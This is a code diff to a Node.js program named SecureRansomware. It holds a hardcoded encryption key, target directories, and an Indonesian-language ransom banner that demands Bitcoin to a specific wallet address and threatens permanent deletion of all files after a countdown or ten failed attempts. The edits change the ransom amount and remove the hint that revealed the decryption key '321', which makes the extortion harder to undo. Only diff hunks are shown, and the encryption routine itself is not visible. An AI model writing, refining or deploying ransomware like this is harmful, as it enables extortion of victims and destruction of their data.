@@ -3,7 +3,6 @@ const path = require('path');
 const crypto = require('crypto');
 const readline = require('readline');
 
-// Hard-encrypted variables
 const ガンツ = {
   key: Buffer.alloc(32, '321'.padEnd(32, '\0')),
   targetDirs: [
@@ -49,7 +48,7 @@ class SecureRansomware {
     
     console.log(`Sisa waktu: ${mins} menit ${secs} detik`);
     console.log(`Percobaan tersisa: ${this.maxAttempts - this.attempts}`);
-    console.log("\nKirim 5 BTC ke wallet berikut:");
+    console.log("\nKirim 0,000002 BTC ke wallet berikut:");
     console.log("bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq");
     console.log("\nSetelah waktu habis atau 10 kesalahan,");
     console.log("SEMUA FILE AKAN DIHAPUS PERMANEN!\n");
@@ -186,7 +185,7 @@ class SecureRansomware {
 
     const prompt = () => {
       this.showBanner();
-      rl.question('Masukkan kunci dekripsi (321): ', (input) => {
+      rl.question('Masukkan key: ', (input) => {
         if (input === '321') {
           this.timerActive = false;
           rl.close();
